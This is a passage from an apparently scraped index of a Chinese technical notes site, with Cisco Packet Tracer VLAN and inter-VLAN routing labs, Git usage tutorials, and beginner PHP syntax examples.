Router(config-if)#no sh Router(config-if)# %LINK-5-CHANGED: Interface GigabitEthernet0/0/1, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0/1, changed state to up 3、配置 VLAN Switch\u003een Switch#conf t Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#vlan 10 Switch(config-vlan)#vlan 20 Switch(config-vlan)#exit Switch(config)#int f0/1 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 10 Switch(config-if)#int f0/2 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 20 Switch(config-if)#do sh vl b Switch(config-if)#int g0/1 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 10 Switch(config-if)#int g0/2 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 20 4、跨 VLAN 通信 ping 192.168.2.1 5、实验分析 当主机 ping 192.168.2.1 时，会检查目标 IP 是否与自身 IP 处于同一网段\n目标 IP 与源 IP 不在同一网段时，主机会将数据包发送到路由器进行路由\n主机查找自身的 ARP 缓存表中路由器的 MAC 地址条目并将 ICMP 包发送到路由器\n若自身 ARP 缓存表中不存在路由器的 MAC 地址条目，会先发送 ARP 报文请求路由器的 MAC 地址，然后将 ICMP 包发送到路由器\nICMP 包从 F0/1 端口进入交换机后会在帧头封装一个 802.1Q VLAN 标签\nTPID：一般为 0x8100，表示这是一个带 VLAN 标签的帧 TCI：包含了 VLAN ID 和优先级等信息 PRI：表示帧的优先级，当交换机阻塞时优先级高的帧会优先发送 CFI：表示 MAC 地址是否为经典格式，在以太网中的值通常为 0（经典格式） VLAN ID：VLAN 编号 ICMP 包从 G0/1 端口离开交换机前会剥掉帧头的 VLAN 标签\nICMP 包从 G0/2 端口进入交换机和从 F0/2 端口离开交换机以及目标主机回包时重复上述步骤，完成通信\nTip\n通过 TCI 判断数据帧所属的 VLAN ：整个 TCI 字段的后 12 位就是 VLAN ID，也可以使用计算公式（VID = TCI \u0026 0x0FFF）。 以 0x000a 为例，该 TCI 字段的后 12 位为 0x00a，即十进制的 10，因此该数据帧属于 VLAN 10。\n6、实验中遇到的问题 Important\n请先尝试自己思考，然后查看答案。\n交换机的 G0/1 和 G0/2 端口设置为 trunk 模式无法进行正常通信 ARP 报文从 F0/1 端口进入交换机后会在帧头封装一个 VLAN 标签 若将 G0/1 和 G0/2 端口设置为 trunk 模式，交换机转发数据帧时不会剥掉 VLAN 标签 路由器的 G0/0/0 和 G0/0/1 是普通物理端口，无法识别携带 VLAN 标签的数据帧 ARP 报文被路由器直接丢弃，主机无法获取到网关的 IP 地址，也就无法发送 ICMP 包 Simulation 看不到数据帧中封装的 VLAN 标签 F0/1 端口是 access 模式，数据帧进入交换机后会在帧头封装一个 VLAN 标签 G0/1 端口是 access 模式，数据帧离开交换机前又会剥掉帧头中的 VLAN 标签 F0/2 和 G0/2 原理同上，VLAN 标签仅在交换机内部进行处理 所以无法在 Simulation 看到数据帧中封装的 VLAN 标签 二、单臂路由 Cisco PT 拓扑图 实验流程 1、配置 PC 的 IP 地址 2、配置路由器端口的 IP 地址 Router\u003een Router#conf t Enter configuration commands, one per line. End with CNTL/Z. Router(config)#int g0/0/0 Router(config-if)#no sh Router(config-if)# %LINK-5-CHANGED: Interface GigabitEthernet0/0/0, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0/0, changed state to up Router(config-if)#int g0/0/0.10 Router(config-subif)# %LINK-5-CHANGED: Interface GigabitEthernet0/0/0.10, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0/0.10, changed state to up Router(config-subif)#en dot1q 10 Router(config-subif)#ip add 192.168.1.254 255.255.255.0 Router(config-subif)#int g0/0/0.20 Router(config-subif)# %LINK-5-CHANGED: Interface GigabitEthernet0/0/0.20, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0/0.20, changed state to up Router(config-subif)#en dot1q 20 Router(config-subif)#ip add 192.168.2.254 255.255.255.0 3、配置 VLAN Switch\u003een Switch#conf t Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#int f0/1 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 10 % Access VLAN does not exist. Creating vlan 10 Switch(config-if)#int f0/2 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 20 % Access VLAN does not exist. Creating vlan 20 Switch(config-if)#int g0/1 Switch(config-if)#sw mo tr Switch(config-if)# %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to down %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to up Switch(config-if)#sw tr al vl al 4、跨 VLAN 通信 ping 192.168.2.1 5、实验分析 使用路由器的单个物理端口创建多个虚拟子接口 在子接口中使用命令 encapsulation dot1Q vlan \u003cVLAN_ID\u003e 启用 dot1Q 封装 进行 dot1Q 封装后的虚拟子接口可以处理携带 VLAN 标签的数据帧 将交换机的 G0/1 端口设置为 trunk 模式，使所有 VLAN 流量都可以到达路由器 ICMP 包从 F0/1 端口进入交换机后会在帧头封装一个 VLAN 10 标签 由于 G0/1 端口是 trunk 模式，转发数据帧时不会剥掉帧头的 VLAN 10 标签 路由器的 G0/0/0.10 子接口收到携带 VLAN 10 标签的数据帧后会进行路由和转发 路由器的 G0/0/0.20 子接口转发数据前会替换 VLAN 标签为 VLAN 20 由于 F0/2 端口是 access 模式，交换机剥掉数据帧中的 VLAN 20 标签后转发到目标主机 三、三层交换技术 Cisco PT 拓扑图 实验流程 1、配置 PC 的 IP 地址 2、配置三层交换机的路由功能 Switch\u003een Switch#conf t Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#vlan 10 Switch(config-vlan)#vlan 20 Switch(config-vlan)#exit Switch(config)#int vlan 10 Switch(config-if)# %LINK-5-CHANGED: Interface Vlan10, changed state to up Switch(config-if)#ip add 192.168.1.254 255.255.255.0 Switch(config-if)#int vlan 20 Switch(config-if)# %LINK-5-CHANGED: Interface Vlan20, changed state to up Switch(config-if)#ip add 192.168.2.254 255.255.255.0 Switch(config-if)#exit Switch(config)#ip routing Switch(config)#int g1/0/1 Switch(config-if)#sw mo tr Switch(config-if)# %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet1/0/1, changed state to down %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet1/0/1, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan10, changed state to up %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan20, changed state to up Switch(config-if)#sw tr al vl al Switch(config-if)#int g1/0/2 Switch(config-if)#sw mo tr Switch(config-if)# %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet1/0/2, changed state to down %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet1/0/2, changed state to up Switch(config-if)#sw tr al vl al Switch(config-if)#exit Switch(config)#do sh ip route Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2 E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area * - candidate default, U - per-user static route, o - ODR P - periodic downloaded static route Gateway of last resort is not set C 192.168.1.0/24 is directly connected, Vlan10 C 192.168.2.0/24 is directly connected, Vlan20 Switch(config)# 3、配置二层交换机 VLAN 交换机 S1：\nSwitch\u003een Switch#conf t Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#int g0/1 Switch(config-if)#sw mo tr Switch(config-if)#sw tr al vl al Switch(config-if)#int f0/1 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 10 % Access VLAN does not exist. Creating vlan 10 Switch(config-if)# 交换机 S2：\nSwitch\u003een Switch#conf t Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#int f0/1 Switch(config-if)#sw mo ac Switch(config-if)#sw ac vl 20 % Access VLAN does not exist. Creating vlan 20 Switch(config-if)#int g0/1 Switch(config-if)#sw mo tr Switch(config-if)#sw tr al vl al Switch(config-if)# 4、跨 VLAN 通信 ping 192.168.2.1 5、实验分析 四、单臂路由访问互联网 五、三层交换技术访问互联网 "},"title":"跨 VLAN 通信"},"/docs/cisco-pt-%E5%AE%9E%E9%AA%8C/vlan-%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/":{"data":{"":"","#":"Cisco PT 拓扑图 实验流程 Switch(config)#vlan 10 Switch(config-vlan)#exit Switch(config)#vlan 20 Switch(config-vlan)#exit 创建 VLAN vlan \u003cVLAN_ID\u003e (vlan 10) Switch#show vlan VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa0/1, Fa0/2, Fa0/3, Fa0/4 Fa0/5, Fa0/6, Fa0/7, Fa0/8 Fa0/9, Fa0/10, Fa0/11, Fa0/12 Fa0/13, Fa0/14, Fa0/15, Fa0/16 Fa0/17, Fa0/18, Fa0/19, Fa0/20 Fa0/21, Fa0/22, Fa0/23, Fa0/24 Gig0/1, Gig0/2 10 VLAN0010 active 20 VLAN0020 active 1002 fddi-default active 1003 token-ring-default active 1004 fddinet-default active 1005 trnet-default active VLAN Type SAID MTU Parent RingNo BridgeNo Stp BrdgMode Trans1 Trans2 ---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------ 1 enet 100001 1500 - - - - - 0 0 10 enet 100010 1500 - - - - - 0 0 20 enet 100020 1500 - - - - - 0 0 1002 fddi 101002 1500 - - - - - 0 0 1003 tr 101003 1500 - - - - - 0 0 1004 fdnet 101004 1500 - - - ieee - 0 0 1005 trnet 101005 1500 - - - ibm - 0 0 VLAN Type SAID MTU Parent RingNo BridgeNo Stp BrdgMode Trans1 Trans2 ---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------ Remote SPAN VLANs ------------------------------------------------------------------------------ Primary Secondary Type Ports ------- --------- ----------------- ------------------------------------------ Switch#show vlan brief VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa0/1, Fa0/2, Fa0/3, Fa0/4 Fa0/5, Fa0/6, Fa0/7, Fa0/8 Fa0/9, Fa0/10, Fa0/11, Fa0/12 Fa0/13, Fa0/14, Fa0/15, Fa0/16 Fa0/17, Fa0/18, Fa0/19, Fa0/20 Fa0/21, Fa0/22, Fa0/23, Fa0/24 Gig0/1, Gig0/2 10 VLAN0010 active 20 VLAN0020 active 1002 fddi-default active 1003 token-ring-default active 1004 fddinet-default active 1005 trnet-default active Switch#show vlan id 1 VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa0/1, Fa0/2, Fa0/3, Fa0/4 Fa0/5, Fa0/6, Fa0/7, Fa0/8 Fa0/9, Fa0/10, Fa0/11, Fa0/12 Fa0/13, Fa0/14, Fa0/15, Fa0/16 Fa0/17, Fa0/18, Fa0/19, Fa0/20 Fa0/21, Fa0/22, Fa0/23, Fa0/24 Gig0/1, Gig0/2 VLAN Type SAID MTU Parent RingNo BridgeNo Stp BrdgMode Trans1 Trans2 ---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------ 1 enet 100001 1500 - - - - - 0 0 显示所有 VLAN 及其基本信息 show vlan brief 显示所有 VLAN 及其详细信息 show vlan 显示单个 VLAN 详细信息 show vlan id \u003cVLAN_ID\u003e (show vlan id 1) Switch(config)#interface fastEthernet 0/2 Switch(config-if)#switchport mode access Switch(config-if)#exit Switch(config)#interface fastEthernet 0/3 Switch(config-if)#switchport mode access Switch(config-if)#exit 将端口设置为接入（Access）模式 switchport mode access Switch(config)#interface fastEthernet 0/2 Switch(config-if)#switchport access vlan 10 Switch(config-if)#exit Switch(config)#interface fastEthernet 0/3 Switch(config-if)#switchport access vlan 20 Switch(config-if)#exit 为端口设置默认 VLAN switchport access vlan \u003cVLAN_ID\u003e (switchport access vlan 10) Switch#show interfaces switchport Name: Fa0/1 Switchport: Enabled Administrative Mode: dynamic auto Operational Mode: static access Administrative Trunking Encapsulation: dot1q Operational Trunking Encapsulation: native Negotiation of Trunking: On Access Mode VLAN: 1 (default) Trunking Native Mode VLAN: 1 (default) Voice VLAN: none Administrative private-vlan host-association: none Administrative private-vlan mapping: none Administrative private-vlan trunk native VLAN: none Administrative private-vlan trunk encapsulation: dot1q Administrative private-vlan trunk normal VLANs: none Administrative private-vlan trunk private VLANs: none Operational private-vlan: none Trunking VLANs Enabled: All Pruning VLANs Enabled: 2-1001 Capture Mode Disabled Capture VLANs Allowed: ALL Protected: false Unknown unicast blocked: disabled Unknown multicast blocked: disabled Appliance trust: none Name: Fa0/2 Switchport: Enabled Administrative Mode: static access Operational Mode: static access Administrative Trunking Encapsulation: dot1q Operational Trunking Encapsulation: native Negotiation of Trunking: Off Access Mode VLAN: 10 (VLAN0010) Trunking Native Mode VLAN: 1 (default) Voice VLAN: none Administrative private-vlan host-association: none Administrative private-vlan mapping: none Administrative private-vlan trunk native VLAN: none Administrative private-vlan trunk encapsulation: dot1q Administrative private-vlan trunk normal VLANs: none Administrative private-vlan trunk private VLANs: none Operational private-vlan: none Trunking VLANs Enabled: All Pruning VLANs Enabled: 2-1001 Capture Mode Disabled Capture VLANs Allowed: ALL Protected: false Unknown unicast blocked: disabled Unknown multicast blocked: disabled Appliance trust: none Name: Fa0/3 Switchport: Enabled Administrative Mode: static access Operational Mode: static access Administrative Trunking Encapsulation: dot1q Operational Trunking Encapsulation: native Negotiation of Trunking: Off Access Mode VLAN: 20 (VLAN0020) Trunking Native Mode VLAN: 1 (default) Voice VLAN: none Administrative private-vlan host-association: none Administrative private-vlan mapping: none Administrative private-vlan trunk native VLAN: none Administrative private-vlan trunk encapsulation: dot1q Switch#show interfaces fastethernet 0/2 switchport Name: Fa0/2 Switchport: Enabled Administrative Mode: static access Operational Mode: static access Administrative Trunking Encapsulation: dot1q Operational Trunking Encapsulation: native Negotiation of Trunking: Off Access Mode VLAN: 10 (VLAN0010) Trunking Native Mode VLAN: 1 (default) Voice VLAN: none Administrative private-vlan host-association: none Administrative private-vlan mapping: none Administrative private-vlan trunk native VLAN: none Administrative private-vlan trunk encapsulation: dot1q Administrative private-vlan trunk normal VLANs: none Administrative private-vlan trunk private VLANs: none Operational private-vlan: none Trunking VLANs Enabled: All Pruning VLANs Enabled: 2-1001 Capture Mode Disabled Capture VLANs Allowed: ALL Protected: false Unknown unicast blocked: disabled Unknown multicast blocked: disabled Appliance trust: none 查看所有端口的详细状态 show interfaces switchport 查看单个接口的详细状态 show interfaces \u003cINTERFACES_ID\u003e switchport (show interfaces fastethernet 0/2 switchport) Switch(config-if)#switchport mode trunk Switch(config-if)# %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state to down %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state to up 将端口设置为干道（Trunk）模式 switchport mode trunk Switch(config-if)#switchport trunk allowed vlan all Switch(config-if)#exit Switch(config)#do show interfaces f0/1 switchport Name: Fa0/1 Switchport: Enabled Administrative Mode: trunk Operational Mode: trunk Administrative Trunking Encapsulation: dot1q Operational Trunking Encapsulation: dot1q Negotiation of Trunking: On Access Mode VLAN: 1 (default) Trunking Native Mode VLAN: 1 (default) Voice VLAN: none Administrative private-vlan host-association: none Administrative private-vlan mapping: none Administrative private-vlan trunk native VLAN: none Administrative private-vlan trunk encapsulation: dot1q Administrative private-vlan trunk normal VLANs: none Administrative private-vlan trunk private VLANs: none Operational private-vlan: none Trunking VLANs Enabled: All Pruning VLANs Enabled: 2-1001 Capture Mode Disabled Capture VLANs Allowed: ALL Protected: false Unknown unicast blocked: disabled Unknown multicast blocked: disabled Appliance trust: none 允许 Trunk 端口通过所有 VLAN 流量 switchport trunk allowed vlan all Switch#show interfaces trunk Port Mode Encapsulation Status Native vlan Fa0/1 on 802.1q trunking 1 Port Vlans allowed on trunk Fa0/1 1-1005 Port Vlans allowed and active in management domain Fa0/1 1,10,20 Port Vlans in spanning tree forwarding state and not pruned Fa0/1 1,10,20 查看当前配置为 Trunk 的端口及其详细信息 show interfaces trunk "},"title":"VLAN 基础配置"},"/docs/git/":{"data":{"":"\r走入 Git\rGit 常用命令\rGit 分支\r远程仓库\rVSCode 集成 Git\rgitignore"},"title":"Git"},"/docs/git/%E8%B5%B0%E5%85%A5-git/":{"data":{"":"","#":"1.Git介绍 Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。\nGit 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。\n版本控制\n版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。\n团队协作\n从单兵作战转换为团队开发。\n2.Git对比SVN SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己的代码推送到中央服务器。集中式版本控制系统是必须联网才能工作。\nGit是分布式版本控制系统，没有中央服务器，每个人的电脑就是一个完整的版本库，工作的时候不需要联网了，因为版本都在自己电脑上，可以离线工作。\n3.Git安装 https://git-scm.com/\n下载好以后，直接双击进行安装就行\n一直下一步就可以，安装再默认路径就行\n安装完毕后检测一下安装是否成功\n方法一： 打开 cmd 窗口，输入指令检查\n# 检测 git 是否安装 $ git --version 出现版本号，说明安装成功\n方法二： 随便找个地方单机 鼠标右键，出现下图内容，说明安装成功\n安装完毕，接下来我们就可以开始使用了"},"title":"走入 Git"},"/docs/git/%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/":{"data":{"":"","#":" 我们的所有内容已经全部保留在了本地历史区 理论上是不会丢失了 但是如果把文件夹删除了，还是没有了 所以我们要使用 git 把我们所有的内容推送到 github 上面保存起来 那么就本地文件夹就算删除了，那么远程上面还有一份，还可以拿回来使用 所以我们现在就要把本地内容推送到远程 这个时候我们接需要一个 github 的账号了 先去 github官网 注册一个账号 1.创建一个远程仓库 有了 github 账号以后\n我们就登录 github 网站，开辟一个远程仓库\ngithub 的远程也是以一个仓库一个仓库的形式来保存代码\n我们可以在一个 github 上保存很多的项目 只要一个项目一个仓库就可以了 按照下面步骤开辟仓库\n先点击新建仓库\n2.添加仓库地址 接下来，要使用 git 上传代码了\n我们先要告诉 git 上传到哪里\n也就是给 git 添加一个上传的地址\n我们还是来到我们的项目文件夹\n使用 git remote add origin 仓库地址 来添加\n# 在项目文件夹下打开 git base # 添加仓库地址 $ git remote add origin ********************* remote：远程的意思 add：添加的意思 origin：是一个变量名（就是指代后面一长串的地址） 3.git push 上传到哪里的地址我们已经添加好了\n接下来就是上传内容了\n上传要保证 历史区 里面有内容 上传的过程会把 历史区 里面所有的内容上传到远端 我们使用 git push 指令来上传\n# 上传内容 $ git push -u origin master # 表示把内容上传到 origin 这个地址 # master 是上传到远程的 master 分支 如果当前分支与多个主机存在追踪关系，则可以使用-u选项指定一个默认主机，这样后面就可以不加任何参数使用git push。 第二次上传\n第二次上传的时候，因为有刚才的记录，就不需要再写 origin 和 master 了\n会默认传递到 origin 这个地址的 master 分支上\n除非你要传递到别的分支上的时候再进行书写\n# 第二次上传 $ git push 到这里，就完成了一次 git 推送\n这个时候本地的文件夹就真的可以删除了\n因为远程有一份我们的内容，本地的删除了，可以直接把远程的拉回来就行\n4.git clone git 克隆是指把远程仓库里面的内容克隆一份到本地\n可以克隆别人的 公开 的仓库，也可以克隆自己的仓库\n克隆别人的仓库，我们只能拿下来用，修改后不能从新上传\n克隆自己的仓库，我们修改后还可以再次上传更新\n输入克隆指令 git clone 仓库地址\n# 直接克隆仓库 $ git clone ************* 5.git pull 当人家的代码更新以后，你想获得最新的代码\n我们不需要从新克隆\n只要拉取一次代码就可以了\n直接在项目文件夹里面使用指令下拉\n# 拉取远程最新代码 $ git pull 这样一来，你本地的仓库就可远程的仓库同步了"},"title":"远程仓库"},"/docs/git/git-%E5%88%86%E6%94%AF/":{"data":{"":"","#":"1.初识分支 git 分支，就是我们自己把我们的整个文件夹分成一个一个独立的区域\n比如我在开发 登录 功能的时候，可以放在 login 分支下进行开发\n开发 列表 功能的时候，可以放在 list 分支下进行开发 大家互不干扰，每一个功能都是一个独立的功能分支 这样开发就会好很多\ngit 在初始化的时候，会自动生成一个分支，叫做 master\n是表示主要分支的意思\n我们就可以自己开辟出很多独立分支\n2.创建分支 开辟一个分支使用 git branch 分支名称 指令\n# 开辟一个 login 分支 $ git branch login 查看一下当前分支情况\n# 查看当前分支情况 $ git branch 会看到，当前有两个分支了 一个是 master，一个是 login 前面有个 * 号，并且有高亮显示的，表示你当前所处的分支 3.切换分支 我们对 登录 功能的开发要移动到 login 分支去完成\n我们切换所处分支使用 git checkout 分支名称\n# 切换到 login 分支 $ git checkout login 然后我们在整个分支上进行 登录 功能的开发\n开发完毕以后，我们就在当前分支上进行提交\n提交以后我们进行分支切换\n发现 master 上面还是最初始的状态 而 login 分支上有我们新写的 登录 功能的代码 我们按照分支把所有功能都开发完毕了以后\n只要把所有代码都合并到 master 主分支上就行了 4.合并分支 git 的合并分支，只能是把别的分支的内容合并到自己的分支上\n使用的指令是 git merge\n# 切换到 master 分支 $ git checkout master # 把 login 的内容合并到自己的分支 $ git merge login 这个时候，我们刚才在 login 上开发的东西就都来到了 master 主分支上\n如果是有多个分支的话，那么所有的最后都合并到 master 分支上的时候\n我们的主分支上就有完整网站的所有页面\n各个分支上都是单独的页面和功能 5.删除分支 这个时候我们开辟的分支就没有什么用了，就可以删除分支了\n先切换到别的分支\n使用指令 git branch -d 分支名称 来删除\n# 先切换到别的分支 $ git checkout master # 删除 login 分支 $ git branch -d login "},"title":"Git 分支"},"/docs/git/git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/":{"data":{"":"","#":"1.设置用户签名 签名的作用就是用来标识用户，以区分不同的开发人员。\ngit config --global user.email \"you@example.com\" git config --global user.name \"Your Name\" 2.初始化本地库 我们希望一个文件夹被 git 管理的话，那么就要在一个文件夹下进行 git 初始化\n找到一个希望被 git 管理的文件夹\n在文件夹内单击鼠标右键，点开 Git Bash Here\n输入指令\n# git 初始化的指令 $ git init 然后文件夹内会多一个 .git 的文件夹（这个文件夹是一个隐藏文件夹）\n这个时候，我的这个 git_demo 文件夹就被 git 管理了\ngit 不光管理这一个文件夹，包括所有的子文件夹和子文件都会被管理 注意： 只有当一个文件夹被 git 管理以后，我们才可以使用 git 的功能去做版本管理\n也就是说，我们必须要把我们电脑中的某一个文件夹授权给 git git 才能对这个文件夹里面的内容进行各种操作 而 git init 就是在进行这个授权的操作 3.Git工作区、暂存区和版本库 托管平台\n局域网(内网) gitlab 公网（外网） gitlab github gitee 码云 4.git add 我们要放入暂存区，要使用 git add 指令\n把单独一个文件放在暂存区\n# 把文件夹下的 index.txt 文本放在暂存区 $ git add index.txt 把单独一个文件夹放在暂存区（暂存区不能存放空文件夹）\n# 把文件夹下的 ceshi文件夹 放在暂存区 $ git add ceshi/ 把所有文件都放在暂存区\n# 把文件夹下所有的内容都放在暂存区 $ git add --all # git add --all 有一个简单的写法 $ git add . 全部存放的时候使用上面两个指令哪个都行 5.git commit # 把暂存区的内容放到历史区 $ git commit -m \"我是第一个版本\" 我们使用 git log 这个指令查看版本信息\n# 查看当前历史区版本信息 $ git log 我们使用 git reset --hard 版本编号 进行历史回退\n# 回退到上一次提交的版本 $ git reset --hard HEAD^ # 回退到上上次提交的版本 $ git reset --hard HEAD^^ $ git reset --hard HEAD~2 6.git revert 与 git reset git reset 是回滚到对应的commit-id，相当于是删除了commit-id以后的所有的提交，并且不会产生新的commit-id记录，如果要推送到远程服务器的话，需要强制推送-f git revert 是反做撤销其中的commit-id，然后重新生成一个commit-id。本身不会对其他的提交commit-id产生影响，如果要推送到远程服务器的话，就是普通的操作git push就好了 "},"title":"Git 常用命令"},"/docs/git/gitignore/":{"data":{"":" 在一些项目中，我们不想让本地仓库的所有文件都上传到远程仓库中，而是有选择的上传，比如：一些依赖文件（node_modules下的依赖）、bin 目录下的文件、测试文件等。一方面将一些依赖、测试文件都上传到远程传输量很大，另一方面，一些文件对于你这边是可用的，在另一个人那可能就不可用了，比如：本地配置文件。\n空行不匹配任何文件；\n如果本地仓库文件已被跟踪，那么即使在 .gitignore 中设置了忽略，也不起作用。\n.gitignore 文件也会被上传的到远程仓库，所以，同一个仓库的人可以使用同一个.gitignore 文件。\n# See https://help.github.com/articles/ignoring-files/ for more about ignoring files. # dependencies # #开头的便是注释 # 忽略文件和目录 /node_modules /.pnp .pnp.js # testing /coverage # production /build # misc .DS_Store .env.local .env.development.local .env.test.local .env.production.local # 使用通配符 npm-debug.log* yarn-debug.log* yarn-error.log* "},"title":"Gitignore"},"/docs/git/vscode-%E9%9B%86%E6%88%90-git/":{"data":{"":"VSCode内置版本控制机制，并自带对Git和Github的支持，你也可以安装插件以支持其他控制软件，如SVN(需要先安装 SVN )等。\n初始化\n可视化界面管理项目 "},"title":"VSCode 集成 Git"},"/docs/php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/":{"data":{"":"\r常量\r运算符\r流程控制"},"title":"PHP 代码审计"},"/docs/php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B8%B8%E9%87%8F/":{"data":{"":"","#":"一、常量定义 define(常量名, 值) const 常量名 = 值 二、预定义常量 即 PHP 已经定义好的可以直接使用的常量\n变量名 值 __FILE__ 当前文件所在的绝对路径 __LINE__ 当前行号 PHP_OS 操作系统类型 PHP_VERSION PHP 版本 DIRECTORY_SEPARATOR 目录分隔符 三、示例代码 \u003c?php // 常量定义的方式 define(\"NAME1\", \"Hello World1\"); const NAME2 = \"Hello World2\"; echo NAME1.\"\u003cbr/\u003e\"; echo NAME2.\"\u003cbr/\u003e\"; // 预定义常量 echo __FILE__.\"\u003cbr/\u003e\"; echo __LINE__.\"\u003cbr/\u003e\"; echo PHP_OS.\"\u003cbr/\u003e\"; echo PHP_VERSION.\"\u003cbr/\u003e\"; echo DIRECTORY_SEPARATOR.\"\u003cbr/\u003e\"; 运行结果：\nHello World1 Hello World2 D:\\Workspace\\php\\learning\\const.php 12 WINNT 7.3.4 \\ "},"title":"常量"},"/docs/php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/":{"data":{"":"","#":"一、顺序结构 示例代码：\n\u003c?php echo \"This is the first echo.\u003cbr/\u003e\"; echo \"This is the second echo.\u003cbr/\u003e\"; echo \"This is the third echo.\u003cbr/\u003e\"; 运行结果：\nThis is the first echo. This is the second echo. This is the third echo. 二、分支结构 1、if 语句 示例代码：\n\u003c?php $score = 75.9; if ($score \u003e 90){ echo \"A.\u003cbr/\u003e\"; }elseif ($score \u003e 80){ echo \"B.\u003cbr/\u003e\"; }elseif ($score \u003e 70){ echo \"C.\u003cbr/\u003e\"; }elseif ($score \u003e 60){ echo \"D.\u003cbr/\u003e\"; }else{ echo \"E.\u003cbr/\u003e\"; } 运行结果：\nC. 2、switch 语句 示例代码：\n\u003c?php $day = 3; switch ($day){ case 1: echo \"Monday.\u003cbr/\u003e\"; break; case 2: echo \"Tuesday.\u003cbr/\u003e\"; break; case 3: echo \"Wednesday.\u003cbr/\u003e\"; break; case 4: echo \"Thursday.\u003cbr/\u003e\"; break; case 5: echo \"Friday.\u003cbr/\u003e\"; break; default: echo \"Weekday.\u003cbr/\u003e\"; } 运行结果：\nWednesday. 三、循环结构 1、while 语句 示例代码：\n\u003c?php $i = 0; while($i \u003c 10){ echo \"{$i}\u003cbr/\u003e\"; $i++; } 运行结果：\n0 1 2 3 4 5 6 7 8 9 2、do while 语句 示例代码：\n\u003c?php $k = 0; do{ echo \"{$k}\u003cbr/\u003e\"; $k++; }while($k \u003c 10); 运行结果：\n0 1 2 3 4 5 6 7 8 9 3、for 语句 示例代码：\n\u003c?php for($j = 0; $j \u003c 10; $j++){ echo \"{$j}\u003cbr/\u003e\"; } 运行结果：\n0 1 2 3 4 5 6 7 8 9 四、特殊流程 1、break 语句 示例代码：\n\u003c?php for($i = 1; $i \u003c= 10; $i++){ if ($i % 3 == 0) { break; } echo \"{$i}\u003cbr/\u003e\"; } 运行结果：\n1 2 2、continue 语句 示例代码：\n\u003c?php for($i = 1; $i \u003c= 10; $i++){ if($i % 3 == 0){ continue; } echo \"{$i}\u003cbr/\u003e\"; } 运行结果：\n1 2 4 5 7 8 10 3、exit die 语句 示例代码：\n\u003c?php echo \"程序结束！\u003cbr/\u003e\"; exit(); \u003c?php exit(\"程序结束！\u003cbr/\u003e\"); 运行结果：\n程序结束！ 示例代码：\n\u003c?php echo \"程序结束！\u003cbr/\u003e\"; die(); \u003c?php die(\"程序结束！\u003cbr/\u003e\"); 运行结果：\n程序结束！ "},"title":"流程控制"},"/docs/php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%BF%90%E7%AE%97%E7%AC%A6/":{"data":{"":"","#":"一、算数运算符 示例代码：\n\u003c?php $a = 10; $b = 3; // 算数运算符 echo (-$b).\"\u003cbr/\u003e\"; echo ($a + $b).\"\u003cbr/\u003e\"; echo ($a - $b).\"\u003cbr/\u003e\"; echo ($a * $b).\"\u003cbr/\u003e\"; echo ($a / $b).\"\u003cbr/\u003e\"; echo ($a % $b).\"\u003cbr/\u003e\"; echo ($a++).\" \".($a).\"\u003cbr/\u003e\"; echo (++$a).\" \".($a).\"\u003cbr/\u003e\"; echo ($a--).\" \".($a).\"\u003cbr/\u003e\"; echo (--$a).\" \".($a).\"\u003cbr/\u003e\"; 运行结果：\n-3 13 7 30 3.3333333333333 1 10 11 12 12 12 11 